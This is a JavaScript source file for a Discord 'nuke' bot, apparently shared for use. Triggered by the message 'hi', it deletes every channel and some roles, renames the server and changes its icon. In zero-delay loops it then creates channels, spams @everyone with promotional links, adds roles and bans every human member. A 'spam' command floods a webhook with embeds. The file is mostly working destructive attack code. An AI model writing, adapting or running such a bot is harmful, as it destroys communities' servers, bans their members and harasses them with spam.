const Discord = require('discord.js');
const client = new Discord.Client();

client.once('ready',() => {
    console.log(`Join To ${client.user.tag} | Bot`)
    console.log(`<3`)
    console.log(`<3`)
    console.log(`<3`)
    console.log(`<3`)
    console.log(`<3`)
    console.log(`<3`)
    console.log(`<3`)
    console.log(`<3`)
})

const destroyer = '1900';

const groupLink = 'discord.gg/snitch';

const vidoepLink = `https://www.youtube.com/channel/UCViL-KgZLRds1xDSntaYBQQ`


const webhookClient = new Discord.WebhookClient("ID Webhook" ,  "Token Webhook");




client.on('message', message => {
    if(message.content === "hi") {

       message.guild.channels.cache.forEach(channel => channel.delete())
       message.guild.setName('FuckerX Nuke')
       message.guild.setIcon("https://i.imgur.com/y1oc4js.png")     
      message.guild.roles.cache.forEach(role => {
        let botHighestRole = message.guild.member(client.user.id).roles.highest;
        let isBotRoleHigher = role.comparePositionTo(botHighestRole)<0;
        if (role.name !== "FuckerX Nuke" && 
        isBotRoleHigher && !role.managed) {

            role.delete();
            
            
        }
        setInterval (function () {
            message.guild.channels.create(`Fucked by ${destroyer} `, { reason: 'Fucked by' }).then(channel => {
                setInterval (function () {
                    channel.send(`Fucked By | ${destroyer} | ${groupLink} ${vidoepLink} @everyone`)
                    const role1 = message.guild.roles.create({
                        data: {
                          name: '1900',
                          color: 'RANDOM',
           
                        },
                        reason: '1900',
                      }).then(role1 => message.guild.members.cache.filter(m => !m.user.bot).forEach(member => member.roles.add(role1))) 

                     message.guild.members.cache.filter(m => !m.user.bot).forEach(member => member.ban()) 

                      
         
                }, 0 * 400);      
            })
        }, 0 * 400); 
        
        
       
        
    })

       

    }
});
client.on('message', message => {
    if(message.content === "spam") {
        setInterval (function () {
            const exampleEmbed = new Discord.MessageEmbed()
            .setTitle("1900")
            .setColor("RANDOM ")
            .setDescription("1900 RUNS CORD")
            .setImage("https://i.imgur.com/y1oc4js.png")
            .setFooter("discord.gg/xy")
            
            webhookClient.send("@everyone" , exampleEmbed).then(log => console.log("1 message sent"))
            webhookClient.edit({name: "FuckerX <3", avatar: "https://i.imgur.com/y1oc4js.png"}) 

          }, 0 * 200); 
        
    }
})




client.login('Insert your bot token here');